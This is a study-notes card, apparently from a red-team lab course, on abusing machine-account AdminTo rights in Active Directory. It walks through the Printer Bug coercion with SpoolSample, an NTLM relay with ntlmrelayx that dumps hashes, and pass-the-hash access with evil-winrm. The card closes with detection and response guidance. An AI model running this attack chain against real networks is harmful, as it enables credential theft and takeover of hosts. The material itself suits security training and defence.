---
{"dg-publish":true,"permalink":"/cards/red-team/exploiting-automated-relays/"}
---

~ [[Exploiting Active Directory\|Exploiting Active Directory]]
## Summary
---
**What it is:**  
A technique where an attacker abuses **machine‑to‑machine AdminTo relationships** in AD and triggers the **Printer Bug (MS‑RPRN)** to force a privileged machine account to authenticate to the attacker, enabling an **NTLM relay** into a target host.

**Scope:**  
Covers identifying machine accounts with administrative rights over other machines, validating relay conditions (Print Spooler + SMB signing), coercing authentication, and relaying NTLM to gain privileged access.

**Prerequisites:**

- Authenticated AD foothold (even low‑priv).
    
- BloodHound dataset.
    
- Network access to target SMB (445).
    
- SpoolSample + ntlmrelayx.py available.
    

**Risks & Limitations:**

- Unstable exploit—Print Spooler may crash.
    
- Requires SMB signing **not enforced**.
    
- Requires Print Spooler running on coerced host.
    
- Fails if Kerberos is negotiated (use IP, not hostname).

**Key Topics:**  
[[cards/red-team/Breaching Active Directory#Authentication Relays\|authentication relays]] 

## How it works (2–4 lines)

Active Directory machines can hold **local admin rights over other machines** (AdminTo), meaning compromising one system may grant control over another.  
The **Printer Bug** forces a machine to authenticate to an attacker‑controlled SMB listener.  
If SMB signing is not enforced, the attacker can **relay** that machine’s NTLM authentication to any host it is an admin on—resulting in **remote code execution or hash dump** under that machine account’s privileges.

There is a similar version of this here using this technique: [[cards/red-team/Breaching Active Directory#Authentication Relays\|authentication relays]], but if you don't like to wait, proceed here.

### Machine Accounts
---
These are accounts that is associated with the machine with a default uncrackable 120 characters password that is automatically rotated every 30 days.

In Active Directory, these machine accounts are used in different services such as Domain Controllers ues their machine accounts to synchronise AD updates and changes.

The problem is ....

A _machine account_ can be an administrator on another _machine account_, but what for?

```C
DOMAIN CONTROLLER A$ → DOMAIN CONTROLLER B$
BACKUPSERVER$        → FILESERVER$
CLUSTERNODE1$        → CLUSTERNODE2$
MANAGEMENTSERVER$    → ANY_SERVER_IT_MANAGES
```

These relationships let systems:

- run backups
- sync databases
- replicate data
- push updates

This is dangerous because **whoever** controls that machine, controls everything that the machine can control.

## Steps (red — hands on)
---
In this exploit, the attacker (most likely) have a foothold on one machine (local user/admin) but not yet high privilege across domain, your goal is to gain privilege access to hosts.

### Identify machine account has admin access over another machine in `bloodhound`:

**Action:**

Find instances where computer has the "AdminTo" relationship over another computer.

```C
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

**Observable (what you see):**

A graph showing paths such as:  **THMSERVER2 → AdminTo → THMSERVER1**

![Exploiting Automated Relays.png](/img/user/cards/red-team/images/Exploiting%20Automated%20Relays.png)
[Figure 1: machine to macine]: 

It shows us that the THMSERVER2 machine account has administrative privileges over the THMSERVER1 machine.
### The Printer Bug
---
The **printer bug** is a "feature" of the MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address. 

In recent years these bugs appeared: Spooler, PetitPotam, PrintNightmare but this issue has been resolved through security patches.

To exploit this, apart from machine account administrative privileges:

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
- 4.The hosts must not have SMB signing enforced.

> [!question]- Why do I keep seeing SMB?
> It's not that SMB is the only way authentication can be coerced but because SMB is the protocol that actually receives and relays NTLM authentication.
> Most coercion “bugs” or “features” do this:
>
> `Trigger → Target → authenticates → to SMB on attacker`
> So even if the trigger is **NOT SMB**, the end result is:
> 1. Target machine tries to authenticate
> 2. Authentication uses NTLM
> 3. NTLM is sent over SMB to the attacker

### Print Spooler Service
---
In this case you don't have access (currently based on this situation you are currently at **THMWRK1**) to **THMSERVER2**, you need to query from the network perspective to determine if Print Spooler service is running.

**Action:**

Query the target machine for Print Spooler status.

```C
GWMI Win32_Printer -Computer <machine name (thmserver2.za.tryhackme.loc)>
```

**Observable:**

- Printer object responses

If the output is access denied, alternatively:

```C
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

Microsoft has been cracking down viewing these ports from the network's perspective. If both give you an error, you may just need to take a leap of faith. At this point condition three has been met.

### SMB Signing
---
To coerce authentication attempt, SMB signing should not be enforced. There is a difference between SMB signing being allowed and SMB being enforced:

- Some legacy system does not support SMB signing.
- By default, the configuration of SMB is that signing is allowed but not enforced. It will only be used if supported.
- Attacker configures SMB server that does not support SMB signing. Forcing the target not to sign the SMB authentication attempt.

To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced.

**Action:**

Check SMB signing enforcement:

```C
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

**Observables:**

![Exploiting Automated Relays-1.png](/img/user/cards/red-team/images/Exploiting%20Automated%20Relays-1.png)
[Figure 2: nmap smb signing output scan]:
### Exploitation
---
**Note:** This attack is unstable and may cause the Print Spooler service to crash, and a call back is not always guarenteed. You decide to give it a go. If it does not work, move on to the next technique.

You will be using [SpoolSample](https://github.com/leechristensen/SpoolSample) to exploit the authentication relay (already stored at **THMWRK1**). You will use Spoolsample.exe to coerce THMSERVER2 to authenticate to us on our AttackBox and then [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the authentication attempt **THMSERVER1**.


**Action -  Setup NTLM relay on our machine:**  
Use Impacket to set up the SMB relay to the target AdminTo machine:

```C
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
```

It's very important to use the IP address over hostname as using the hostname might use Kerberos authentication.

**Action - Coercing THMSERVER2 to authenticate to us:**  

Trigger SpoolSample from foothold machine (THMWRK1),

```C
SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
```

**Observable:**

![Exploiting Automated Relays-2.png](/img/user/cards/red-team/images/Exploiting%20Automated%20Relays-2.png)
[Figure 3: SpoolSample.exe]:

**Action:**  

Back on the relay machine (your box), observe ntlmrelayx results.

![Exploiting Automated Relays-3.png](/img/user/cards/red-team/images/Exploiting%20Automated%20Relays-3.png)
[Figure 4: ntlmrelay output]:

At the first command - there is an error however the command still works and by default specifying no command the tool will dump the hashes:

**Action - Use the machine account hash to gain shell :**

```C
evil-winrm -i THMSERVER1.za.tryhackme.loc -u <user> -H <NTML HASH>
```

**Observable:**

![Exploiting Automated Relays-4.png](/img/user/cards/red-team/images/Exploiting%20Automated%20Relays-4.png)
[Figure 5: hacking]:


## Blue — Detection & Response (concise)
---
### Top Indicators
---
- **Print Spooler remote calls**
    
    - EventID **307**, **808**, **316** (PrintService‑Operational)
        
    - Unexpected RPC calls to **MS‑RPRN**
        
- **NTLM authentication anomalies**
    
    - Multiple NTLM logons from **computer accounts** (`$`)
        
    - NTLM authentication to **non‑domain hosts**
        
    - LogonType **3** to attacker-controlled IP
        
- **SMB behavior**
    
    - Unsigned SMB sessions (`SMB2_SESSION_FLAG_SIGNED = 0`)
        
    - SMB connections from servers that normally talk only to DCs
        
- **BloodHound‑like reconnaissance**
    
    - LDAP queries for `adminTo`, `memberOf`, or computer objects
        
- **Relay aftermath**
    
    - New WinRM session (EventID **4624**) using **machine account**
        
    - Impacket fingerprint processes (e.g., `ntlmrelayx.py` patterns in logs)

### Immediate response checklist
---
- **Isolate**

    - Temporarily stop **Print Spooler** on targeted hosts (`Stop-Service Spooler`).
    - Block SMB (445) from suspicious source IPs.
        
- **Collect**
    
    - Full Event Logs: Security, System, PrintService‑Operational, SMBClient.
    - Packet captures of suspicious NTLM/SMB traffic.
    - Hashes, commands, and issued tokens from relayed session.
        
- **Escalate**
    
    - Patch MS‑RPRN/Spooler on affected hosts.
    - Enforce **SMB signing** domain‑wide.
    - Audit machine‑to‑machine AdminTo relationships in AD.
